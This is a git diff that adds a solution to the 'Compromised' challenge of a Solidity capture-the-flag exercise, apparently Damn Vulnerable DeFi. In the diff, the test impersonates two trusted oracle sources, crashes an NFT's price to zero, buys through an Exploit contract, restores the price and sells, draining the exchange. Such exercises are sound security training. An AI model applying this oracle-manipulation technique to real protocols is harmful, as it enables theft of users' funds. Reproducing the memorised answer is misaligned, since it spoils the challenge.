@@ -4,7 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {VmSafe} from "forge-std/Vm.sol";
-
+import {Exploit} from "./Exploit.sol";
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
@@ -19,7 +19,6 @@ contract CompromisedChallenge is Test {
     uint256 constant INITIAL_NFT_PRICE = 999 ether;
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
-
 
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
@@ -75,7 +74,25 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Start the attack
+        Exploit exploit = new Exploit{value: address(this).balance}(oracle, exchange, nft, recovery);
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+
+        exploit.buy();
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 999 ether);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 999 ether);
+        vm.stopPrank();
+        exploit.sell();
+        exploit.recover(999 ether);
     }
 
     /**
